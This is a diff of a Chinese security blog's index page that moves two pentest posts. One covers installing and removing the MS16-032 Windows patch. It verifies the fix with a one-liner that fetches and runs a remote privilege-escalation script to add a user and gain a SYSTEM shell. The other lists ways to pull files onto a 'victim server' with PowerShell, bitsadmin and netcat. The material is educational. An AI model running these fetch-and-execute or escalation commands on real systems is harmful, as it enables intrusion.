@@ -4033,6 +4033,393 @@ $
 
 
   
+    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+    </h1>
+  
+
+        
+        <a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p># </p>
+<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
+<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
+<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
+<p>在跳转页面后，点击<code>Download</code>，下载</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
+<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
+<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
+<pre><code>E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu
+
+E:\MS16-032&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
+<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
+<pre><code>E:\MS16-032&gt;systeminfo
+...
+系统类型:         x64-based PC
+处理器:           安装了 2 个处理器。
+修补程序:         安装了 5 个修补程序。
+                  [01]: KB2534111
+                  [02]: KB2999226
+                  [03]: KB3139914
+                  [04]: KB958488
+                  [05]: KB976902
+...
+E:\MS16-032&gt;
+</code></pre><p>当前系统存在的用户</p>
+<pre><code>E:\MS16-032&gt;net user
+
+\\WIN... 的用户帐户
+
+---------------------------------------------------------
+Administrator            Guest                    HSW
+命令成功完成。
+</code></pre><p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
+<pre><code>E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot;
+     __ __ ___ ___   ___     ___ ___ ___
+    |  V  |  _|_  | |  _|___|   |_  |_  |
+    |     |_  |_| |_| . |___| | |_  |  _|
+    |_|_|_|___|_____|___|   |___|___|___|
+
+                   [by b33f -&gt; @FuzzySec]
+
+[?] Operating system core count: 2
+[&gt;] Duplicating CreateProcessWithLogonW handles..
+[!] No valid thread handles were captured, exiting!
+
+E:\MS16-032&gt;
+</code></pre><p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
+<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
+<pre><code>E:\MS16-032&gt;wusa /uninstall /kb:3139914
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
+<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
+<pre><code>E:\MS16-032&gt;systeminfo
+...
+系统类型:         x64-based PC
+处理器:           安装了 2 个处理器。
+修补程序:         安装了 5 个修补程序。
+                  [01]: KB2534111
+                  [02]: KB2999226
+                  [03]: KB958488
+                  [04]: KB976902
+...
+E:\MS16-032&gt;
+</code></pre><p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
+<pre><code>E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot;
+     __ __ ___ ___   ___     ___ ___ ___
+    |  V  |  _|_  | |  _|___|   |_  |_  |
+    |     |_  |_| |_| . |___| | |_  |  _|
+    |_|_|_|___|_____|___|   |___|___|___|
+
+                   [by b33f -&gt; @FuzzySec]
+
+[?] Operating system core count: 2
+[&gt;] Duplicating CreateProcessWithLogonW handles..
+...
+[&gt;] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+E:\MS16-032&gt;net user
+
+\\WIN... 的用户帐户
+
+-----------------------------------------------------
+Administrator            Guest                    HSW
+test_test
+命令成功完成。
+
+E:\MS16-032&gt;
+</code></pre><p>脚本又能执行成功了，说明我们成功卸载补丁</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+    </h1>
+  
+
+        
+        <a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<pre><code class="bash">$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
+
+如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;)
+注意：下载的路径如果出现中文字的路径，可能会出错
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">PS C:&gt; .test.ps1
+</code></pre>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<pre><code class="bash">C:&gt;powershell set-executionpolicy unrestricted
+</code></pre>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
+<pre><code>E:\&gt;powershell executionpolicy
+Restricted
+</code></pre><p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<pre><code>E:\&gt;powershell -exec bypass
+Windows PowerShell
+版权所有 (C) 2009 Microsoft Corporation。保留所有权利。
+
+PS E:\&gt; executionpolicy
+Bypass
+</code></pre><h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<pre><code class="bash">Set args = Wscript.Arguments
+Url = &quot;http://domain/file&quot;
+dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 &#39;
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;
+end with
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">C:&gt;cscript test.vbs
+</code></pre>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<pre><code class="bash">#!/usr/bin/perl 
+use LWP::Simple; 
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">root@kali:~# perl test.pl
+</code></pre>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<pre><code class="bash">#!/usr/bin/python 
+import urllib2 
+u = urllib2.urlopen(&#39;http://domain/file&#39;) 
+localFile = open(&#39;local_file&#39;, &#39;w&#39;) 
+localFile.write(u.read()) 
+localFile.close()
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">root@kali:~# python test.py
+</code></pre>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<pre><code class="bash">#!/usr/bin/ruby
+require &#39;net/http&#39;
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">root@kali:~# ruby test.rb
+</code></pre>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<pre><code class="bash">#!/usr/bin/php 
+&quot;http://example.com/file&quot;);
+$lf = &quot;local_file&quot;;         
+$fh = fopen($lf, &#39;w&#39;);         
+fwrite($fh, $data[0]);         
+fclose($fh); 
+?&gt;
+</code></pre>
+<p>执行：</p>
+<pre><code class="bash">root@kali:~# php test.php
+</code></pre>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<pre><code class="bash">ftp 127.0.0.1 username password get file exit
+</code></pre>
+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<pre><code class="bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
+</code></pre>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<pre><code class="bash">bitsadmin /transfer n http://domain/file c:%homepath%file
+</code></pre>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<pre><code class="bash">wget http://example.com/file
+</code></pre>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
+<pre><code class="bash">cat file | nc -l 1234
+</code></pre>
+<p>target执行：</p>
+<pre><code class="bash">nc host_ip 1234 &gt; file
+</code></pre>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<pre><code class="bash">nc -l 3737 &gt; test.txt
+</code></pre>
+<p>传送端，发送</p>
+<pre><code class="bash">nc [ip] 3737 &lt; test.txt
+</code></pre>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<pre><code class="bash">nc -l 3737 &lt; test.txt
+</code></pre>
+<p>接收端，连接</p>
+<pre><code class="bash">nc [ip] 3737 &gt; test.txt
+</code></pre>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<pre><code class="bash">nc -l 3737 | tar zxvf -
+</code></pre>
+<p>发送端，压缩并发送</p>
+<pre><code class="bash">tar zxvf - * | nc [ip] 3737
+</code></pre>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<pre><code class="bash">net use x: \127.0.0.1\share /user:example.comuserID myPassword
+</code></pre>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-MS16-032（CVE-2016-0099）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -4267,227 +4654,6 @@ E:\MS16-032&gt;net user test_test
       
         <p class="article-more-link">
           <a class="article-more-a" href="knlvre.github.io/2019/10/04/MS16-032（CVE-2016-0099）复现/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-    </h1>
-  
-
-        
-        <a href="knlvre.github.io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<pre><code class="bash">$p = New-Object System.Net.WebClient
-$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
-
-如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;)
-注意：下载的路径如果出现中文字的路径，可能会出错
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">PS C:&gt; .test.ps1
-</code></pre>
-<p>如果Powershell禁止执行了，使用如下命令：</p>
-<pre><code class="bash">C:&gt;powershell set-executionpolicy unrestricted
-</code></pre>
-<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
-<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<pre><code>E:\&gt;powershell executionpolicy
-Restricted
-</code></pre><p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<pre><code>E:\&gt;powershell -exec bypass
-Windows PowerShell
-版权所有 (C) 2009 Microsoft Corporation。保留所有权利。
-
-PS E:\&gt; executionpolicy
-Bypass
-</code></pre><h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<pre><code class="bash">Set args = Wscript.Arguments
-Url = &quot;http://domain/file&quot;
-dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
-dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
-xHttp.Open &quot;GET&quot;, Url, False
-xHttp.Send
-with bStrm
-    .type = 1 &#39;
-    .open
-    .write xHttp.responseBody
-    .savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;
-end with
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">C:&gt;cscript test.vbs
-</code></pre>
-<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<pre><code class="bash">#!/usr/bin/perl 
-use LWP::Simple; 
-getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">root@kali:~# perl test.pl
-</code></pre>
-<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<pre><code class="bash">#!/usr/bin/python 
-import urllib2 
-u = urllib2.urlopen(&#39;http://domain/file&#39;) 
-localFile = open(&#39;local_file&#39;, &#39;w&#39;) 
-localFile.write(u.read()) 
-localFile.close()
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">root@kali:~# python test.py
-</code></pre>
-<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<pre><code class="bash">#!/usr/bin/ruby
-require &#39;net/http&#39;
-Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
-r = http.get(&quot;/file&quot;)
-open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
-file.write(r.body)
-}
-}
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">root@kali:~# ruby test.rb
-</code></pre>
-<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<pre><code class="bash">#!/usr/bin/php 
-&quot;http://example.com/file&quot;);
-$lf = &quot;local_file&quot;;         
-$fh = fopen($lf, &#39;w&#39;);         
-fwrite($fh, $data[0]);         
-fclose($fh); 
-?&gt;
-</code></pre>
-<p>执行：</p>
-<pre><code class="bash">root@kali:~# php test.php
-</code></pre>
-<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<pre><code class="bash">ftp 127.0.0.1 username password get file exit
-</code></pre>
-<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
-<p>复制</p>
-<pre><code class="bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
-</code></pre>
-<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<pre><code class="bash">bitsadmin /transfer n http://domain/file c:%homepath%file
-</code></pre>
-<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<pre><code class="bash">wget http://example.com/file
-</code></pre>
-<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<pre><code class="bash">cat file | nc -l 1234
-</code></pre>
-<p>target执行：</p>
-<pre><code class="bash">nc host_ip 1234 &gt; file
-</code></pre>
-<p><strong>Netcat补充</strong>：</p>
-<p><code>传输文件</code></p>
-<p>方法一：</p>
-<p>接收端，先监听</p>
-<pre><code class="bash">nc -l 3737 &gt; test.txt
-</code></pre>
-<p>传送端，发送</p>
-<pre><code class="bash">nc [ip] 3737 &lt; test.txt
-</code></pre>
-<p>方法二：</p>
-<p>发送端，先监听</p>
-<pre><code class="bash">nc -l 3737 &lt; test.txt
-</code></pre>
-<p>接收端，连接</p>
-<pre><code class="bash">nc [ip] 3737 &gt; test.txt
-</code></pre>
-<p><code>传送目录</code></p>
-<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
-<p>接收端，先监听并准备解压缩</p>
-<pre><code class="bash">nc -l 3737 | tar zxvf -
-</code></pre>
-<p>发送端，压缩并发送</p>
-<pre><code class="bash">tar zxvf - * | nc [ip] 3737
-</code></pre>
-<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<pre><code class="bash">net use x: \127.0.0.1\share /user:example.comuserID myPassword
-</code></pre>
-<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
-<li><ol>
-<li>打开记事本</li>
-</ol>
-</li>
-<li><ol>
-<li>文件，打开</li>
-</ol>
-</li>
-<li><ol>
-<li>在文件名处填入下载地址</li>
-</ol>
-</li>
-</ul>
-<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
         </p>
       
 
@@ -4843,172 +5009,6 @@ gcc exp.c -o exp
       
         <p class="article-more-link">
           <a class="article-more-a" href="knlvre.github.io/2019/10/04/Linux 提权常用命令集/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
-    </h1>
-  
-
-        
-        <a href="knlvre.github.io/2019/10/04/Windows系统添加补丁/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p># </p>
-<h1 id="补丁下载"><a href="#补丁下载" class="headerlink" title="补丁下载"></a>补丁下载</h1><p>各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到<code>Microsoft</code>的官网去查看和下载：<a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></p>
-<p>点击左边栏的<code>Security Bulletins</code>可以查找想要看的漏洞</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-1.png" alt="1"></p>
-<p>这里以打<code>MS16-032（CVE-2016-0099）</code>的补丁为例：左边栏找到<code>MS16-032</code>，找到系统对应版本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-2.png" alt="2"></p>
-<p>在跳转页面后，点击<code>Download</code>，下载</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-3.png" alt="3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-4.png" alt="4"></p>
-<h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p>Windows系统自带补丁安装程序：<code>wusa</code>。命令行执行<code>wusa.exe</code>可以弹出使用帮助</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-5.png" alt="5"></p>
-<p>命令行安装补丁（要制定完整的文件地址，不能是相对地址）</p>
-<pre><code>E:\MS16-032&gt;wusa E:\MS16-032\Windows6.1-KB3139914-x64.msu
-
-E:\MS16-032&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-6.png" alt="6"></p>
-<p>补丁安装完成需要<code>重启计算机才能生效</code>。重启完之后，看一下补丁的安装情况。可以看到<code>KB3139914</code>已经安装了</p>
-<pre><code>E:\MS16-032&gt;systeminfo
-...
-系统类型:         x64-based PC
-处理器:           安装了 2 个处理器。
-修补程序:         安装了 5 个修补程序。
-                  [01]: KB2534111
-                  [02]: KB2999226
-                  [03]: KB3139914
-                  [04]: KB958488
-                  [05]: KB976902
-...
-E:\MS16-032&gt;
-</code></pre><p>当前系统存在的用户</p>
-<pre><code>E:\MS16-032&gt;net user
-
-\\WIN... 的用户帐户
-
----------------------------------------------------------
-Administrator            Guest                    HSW
-命令成功完成。
-</code></pre><p>执行<code>MS16-032（CVE-2016-0099）</code>的脚本，可以参考之前这篇文章：</p>
-<pre><code>E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot;
-     __ __ ___ ___   ___     ___ ___ ___
-    |  V  |  _|_  | |  _|___|   |_  |_  |
-    |     |_  |_| |_| . |___| | |_  |  _|
-    |_|_|_|___|_____|___|   |___|___|___|
-
-                   [by b33f -&gt; @FuzzySec]
-
-[?] Operating system core count: 2
-[&gt;] Duplicating CreateProcessWithLogonW handles..
-[!] No valid thread handles were captured, exiting!
-
-E:\MS16-032&gt;
-</code></pre><p>从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了</p>
-<h1 id="补丁卸载"><a href="#补丁卸载" class="headerlink" title="补丁卸载"></a>补丁卸载</h1><p>命令行</p>
-<pre><code>E:\MS16-032&gt;wusa /uninstall /kb:3139914
